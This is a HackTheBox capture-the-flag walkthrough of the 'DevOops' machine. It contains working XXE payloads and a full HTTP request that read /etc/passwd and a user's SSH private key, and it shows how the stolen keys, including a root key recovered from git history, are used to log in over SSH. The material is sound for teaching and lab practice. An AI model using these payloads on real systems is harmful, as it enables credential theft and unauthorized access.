# DevOops — HackTheBox Walkthrough

**Machine:** DevOops  
**OS:** Linux  
**Difficulty:** Medium  
**Key Topics:** XXE (XML External Entity), SSH Key Extraction, Git History Analysis

---

## Nmap Scan

Starting off with a full nmap scan to see what we're working with.

```
./nmapAutomator.sh 10.129.110.38 -t All

Running all scans on 10.129.110.38
Host is likely running Linux

---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports open: SSH on 22 and an HTTP service on 5000. Port 5000 is running Gunicorn, which is a common Python WSGI server — this is likely a Flask or similar Python web app. The OpenSSH version points to Ubuntu 16.04 Xenial.

---

## Enumeration

### Port 5000 — Web Application

![DevOops homepage showing blogfeeder under construction](../HTB_imgs/Pasted%20image%2020260709081208.png)

The homepage shows a placeholder page for a "Blogfeeder" application — it says it's under construction and this is `feed.py`, the MVP. Not much to interact with here, so let's run a directory scan to find hidden pages.

### Gobuster Scan

![Gobuster scan results showing /feed and /upload](../HTB_imgs/Pasted%20image%2020260709085548.png)

Gobuster finds two interesting paths: `/feed` (which is just the image source for the homepage) and `/upload` — that one looks promising.

### /upload — XML File Upload

![Upload page accepting XML files with Author, Subject, Content elements](../HTB_imgs/Pasted%20image%2020260709081415.png)

The `/upload` page is a test API that accepts XML file uploads. It tells us the expected XML elements: **Author**, **Subject**, and **Content**. Any time I see an application that parses user-supplied XML, my first thought goes straight to XXE.

---

## Exploitation — XXE (XML External Entity Injection)

**What is XXE?** XML External Entity injection is an attack against applications that parse XML input. It works by defining a custom entity in the XML document's DOCTYPE that references an external resource — typically a local file on the server using the `file://` protocol. When the XML parser processes the document, it resolves the entity and includes the file contents in its output. This essentially gives us arbitrary file read on the target, limited only by the permissions of the user running the web application.

### Reading /etc/passwd

I crafted an XXE payload to read `/etc/passwd` from the server. The idea is to define an external entity that points to the file, then reference that entity inside one of the XML elements the app expects:

```xml
<?xml version="1.0"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
  ]>
  <feed>
    <Author>raj</Author>
    <Subject>chandel</Subject>
    <Content>&xxe;</Content>
  </feed>
```

I uploaded this through Burp Suite to have full control over the request:

![Burp Suite request with XXE payload targeting /etc/passwd](../HTB_imgs/Pasted%20image%2020260709082209.png)

And it worked — the server processed the XML, resolved the entity, and dumped the entire contents of `/etc/passwd` back in the response:

![Response showing /etc/passwd contents](../HTB_imgs/Pasted%20image%2020260709082321.png)

The parser is vulnerable to XXE because it processes external entities without any restriction. Now I can read any file on the system that the web app user has permission to access.

### Identifying Users with Shell Access

From the `/etc/passwd` output, I filtered for users that have a real login shell (`/bin/bash`). Three users stood out: **root**, **git**, and **roosa**.

![Filtering passwd for bash users](../HTB_imgs/Pasted%20image%2020260709082618.png)

### Stealing SSH Keys

Since SSH is open on port 22, the next logical step is to check if any of these users have an SSH private key (`id_rsa`) sitting in their home directory. If I can read one via XXE, I can log in directly.

I modified the XXE payload to target each user's `~/.ssh/id_rsa`:

**Trying `/home/git/.ssh/id_rsa`** — no result, empty response:

![No id_rsa found for git user](../HTB_imgs/Pasted%20image%2020260709082658.png)

**Trying `/home/roosa/.ssh/id_rsa`** — success!

![Roosa's SSH private key leaked via XXE](../HTB_imgs/Pasted%20image%2020260709082736.png)

The full Burp request that extracted roosa's key:

```http
POST /upload HTTP/1.1
Host: 10.129.110.38:5000
Content-Type: multipart/form-data; boundary=----geckoformboundary5f70ceebcd0d31e69862767e7668eeea

------geckoformboundary5f70ceebcd0d31e69862767e7668eeea
Content-Disposition: form-data; name="file"; filename="b.xml"
Content-Type: text/xml

<?xml version="1.0"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >
  ]>
  <feed>
    <Author>raj</Author>
    <Subject>chandel</Subject>
    <Content>&xxe;</Content>
  </feed>

------geckoformboundary5f70ceebcd0d31e69862767e7668eeea--
```

---

## User Flag — SSH as Roosa

I saved roosa's private key to a file, set the correct permissions, and connected via SSH:

```bash
chmod 600 id_rsa
ssh roosa@10.129.110.38 -i id_rsa
```

![Successful SSH login as roosa](../HTB_imgs/Pasted%20image%2020260709083056.png)

We're in! Grabbed the user flag right away:

![User flag captured](../HTB_imgs/Pasted%20image%2020260709083504.png)

---

## Privilege Escalation — Git History to Root

### Discovering the Git Repository

After poking around roosa's home directory, I found a `.git` folder inside `~/work/blogfeed/`. Whenever you find a git repository on a target, it's always worth checking the commit history — developers sometimes accidentally commit sensitive data like credentials or keys, and even if they "fix" it later, the old data is still in the git log.

![Git directory listing in ~/work/blogfeed](../HTB_imgs/Pasted%20image%2020260709083901.png)

### Reviewing Git Log

Running `git log` revealed some very interesting commit messages:

![Git log showing commit history](../HTB_imgs/Pasted%20image%2020260709084132.png)

Two commits immediately caught my eye:

- `d387abf` — *"add key for feed integration from tnerprise backend"*
- `33e87c3` — *"reverted accidental commit with proper key"*

So someone (roosa) accidentally committed the wrong key, then reverted it. But in git, nothing is truly deleted — the old commit still has the original key stored in its diff.

### Extracting the Old SSH Key

I used `git show` on the revert commit to see what changed. The diff shows the old key being removed (lines prefixed with `-`) and replaced with a new one:

![git show revealing the old RSA private key in diff](../HTB_imgs/Pasted%20image%2020260709084445.png)

The removed key (the red lines starting with `-`) is the one that was accidentally committed — and it turns out to be a valid SSH key for root.

### Root Flag — SSH as Root

I saved the old key to a file, set permissions, and tried logging in as root:

```bash
chmod 600 root_rsa
ssh -i root_rsa root@10.129.110.38
```

![Successful SSH login as root](../HTB_imgs/Pasted%20image%2020260709085146.png)

And we're root! Grabbed the root flag:

![Root flag captured](../HTB_imgs/Pasted%20image%2020260709085411.png)

---

## Summary

This box had a clean two-step attack chain:

1. **Initial Access:** Found an XML upload endpoint on a Gunicorn/Flask web app. Exploited an XXE vulnerability to read arbitrary files from the server, including roosa's SSH private key, which gave us a shell.

2. **Privilege Escalation:** Discovered a git repository in roosa's home directory. By examining the commit history, found that an SSH private key for root had been accidentally committed and then "reverted" — but the old key was still accessible in the git diff. Used it to SSH in as root.

The key takeaway: git never forgets. If sensitive data is committed, even briefly, a simple revert doesn't remove it from the repository history. The only safe remediation is to rotate the exposed credentials entirely.
